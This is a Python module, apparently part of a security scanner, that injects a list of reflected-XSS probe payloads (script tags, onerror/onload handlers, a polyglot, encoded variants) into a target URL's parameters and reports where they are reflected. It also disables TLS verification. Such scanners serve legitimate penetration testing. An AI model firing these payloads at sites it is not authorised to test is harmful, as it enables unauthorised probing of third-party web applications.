import httpx
import re
import urllib.parse

XSS_PAYLOADS = [
    ("basic", "<script>alert(1)</script>"),
    ("img_onerror", "<img src=x onerror=alert(1)>"),
    ("svg_onload", "<svg onload=alert(1)>"),
    ("body_onload", "<body onload=alert(1)>"),
    ("iframe", "<iframe src=javascript:alert(1)>"),
    ("details", "<details open ontoggle=alert(1)>"),
    ("input_focus", "<input autofocus onfocus=alert(1)>"),
    ("polyglot", "\"'><img src=x onerror=alert(1)>"),
    ("url_encoded", "%3Cscript%3Ealert(1)%3C/script%3E"),
    ("unicode", "<script>\\u0061lert(1)</script>"),
]

async def xss_detect(target: str, param: str = "", method: str = "get") -> dict:
    results = []
    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)

    if not params and not param:
        return {"target": target, "error": "No URL parameters found", "results": []}

    test_params = [param] if param else list(params.keys())

    async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
        for p in test_params:
            for payload_name, payload in XSS_PAYLOADS:
                try:
                    if method == "get":
                        new_params = {k: v[0] for k, v in params.items()}
                        new_params[p] = payload
                        url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(new_params)}"
                        resp = await client.get(url)
                    else:
                        data = {p: payload}
                        resp = await client.post(target, data=data)

                    body = resp.text
                    reflected = payload[:20] in body

                    # Check context: reflected in HTML, script, or attribute?
                    if reflected:
                        context = ""
                        if re.search(rf'>\s*{re.escape(payload[:20])}', body):
                            context = "html_context"
                        elif re.search(rf'<script[^>]*>[^<]*{re.escape(payload[:20])}', body):
                            context = "script_context"
                        elif re.search(rf'=[\s"]*{re.escape(payload[:20])}', body):
                            context = "attribute_context"

                        results.append({
                            "param": p,
                            "payload": payload_name,
                            "payload_value": payload[:60],
                            "reflected": True,
                            "context": context or "unknown",
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                        })
                except Exception:
                    pass

    return {"target": target, "params_tested": test_params, "results": results, "vulnerable": len(results) > 0}
